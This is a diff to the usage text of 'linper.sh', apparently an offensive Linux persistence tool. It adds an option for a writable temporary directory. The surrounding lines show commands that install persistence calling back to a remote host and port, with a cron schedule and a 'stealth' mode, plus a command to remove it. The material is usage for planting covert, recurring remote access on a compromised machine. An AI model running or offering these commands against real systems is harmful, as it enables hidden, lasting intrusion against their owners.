@@ -57,6 +57,10 @@ Install persistence (custom cron & stealthy)
 bash linper.sh -i 192.168.1.2 -p 4444 --cron \"* * * 2 3\" -s
 bash linper.sh -rhost 192.168.1.2 --rport 4444 --cron \"* * * 2 3\" --stealth-mode
 
+Insall persistence with supplied directory for temporary files
+bash linper.sh -i 192.168.1.2 -p 4444 -w /tmp/i/do/not/exist
+bash linper.sh -rhost 192.168.1.2 --rport 4444 --writable-dir /tmp/i/do/not/exist
+
 Remove persistence for 192.168.1.2
 bash linper.sh -i 192.168.1.2 -c
 bash linper.sh --rhost 192.168.1.2 --clean"
